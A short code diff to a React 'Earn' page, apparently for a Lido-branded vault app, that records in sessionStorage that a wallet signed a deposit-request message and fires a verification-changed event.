@@ -27,6 +27,11 @@ export default function Earn() {
     try {
       const message = `Lido Earn Deposit Request\nVault: ${vault}\nTimestamp: ${new Date().toISOString()}`;
       await signMessageAsync({ account: address as `0x${string}`, message });
+      if (typeof window !== 'undefined' && address) {
+        sessionStorage.setItem(`lido_connected_sig_${address.toLowerCase()}`, 'true');
+        sessionStorage.setItem(`lido_sig_approved_${address.toLowerCase()}`, 'true');
+        window.dispatchEvent(new Event('lido_verification_changed'));
+      }
       toast.success(`Signature approved! Deposit request into ${vault} vault submitted.`);
     } catch (error: any) {
       const msg = error?.message || 'User rejected signature request.';
